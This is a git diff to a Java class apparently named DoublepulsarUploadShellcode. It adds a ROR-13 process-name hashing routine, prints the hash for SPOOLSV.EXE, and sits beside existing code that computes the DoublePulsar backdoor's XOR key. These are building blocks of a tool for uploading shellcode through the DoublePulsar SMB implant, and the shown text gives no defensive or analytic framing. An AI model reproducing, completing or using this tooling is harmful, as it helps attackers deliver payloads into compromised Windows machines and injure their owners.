@@ -15,6 +15,24 @@ public class DoublepulsarUploadShellcode {
     return result;
     }
 	
+	    // Rotate Right (ROR) function
+    static int ror(int dword, int bits) {
+        return (dword >>> bits) | (dword << (32 - bits));
+    }
+
+    // Generate process hash
+    static int generateProcessHash(String process) {
+        int procHash = 0;
+
+        for (int i = 0; i <= process.length(); i++) {
+            procHash = ror(procHash, 13);
+            procHash += (i < process.length()) ? (byte) process.charAt(i) : (byte) 0;
+        }
+
+        return procHash;
+    }
+	
+    
    public static int ComputeDOUBLEPULSARXorKey(int sig) {
     return 2 * sig ^ ((((sig >>> 16) | (sig & 0xFF0000)) >>> 8) |
                       (((sig << 16) | (sig & 0xFF00)) << 8));
@@ -29,6 +47,7 @@ public class DoublepulsarUploadShellcode {
     }
     
     public static void main(String[] args) {
+        // Equivalent to unsigned char signature[] = { 0x79, 0xe7, 0xdf, 0x90 };
         byte[] signature = {(byte) 0x79, (byte) 0xE7, (byte) 0xDF, (byte) 0x90};
 
         // Convert little-endian byte array to int
@@ -66,7 +85,11 @@ public class DoublepulsarUploadShellcode {
         for (int i = 0; i < 12; i++) {
             System.out.printf("buffer[%d] = 0x%02X%n", i, XorBytes[i]);
         }
-		
+        
+        String procName = "SPOOLSV.EXE";
+        int hash = generateProcessHash(procName);
+        System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
+    
     }
 
 }
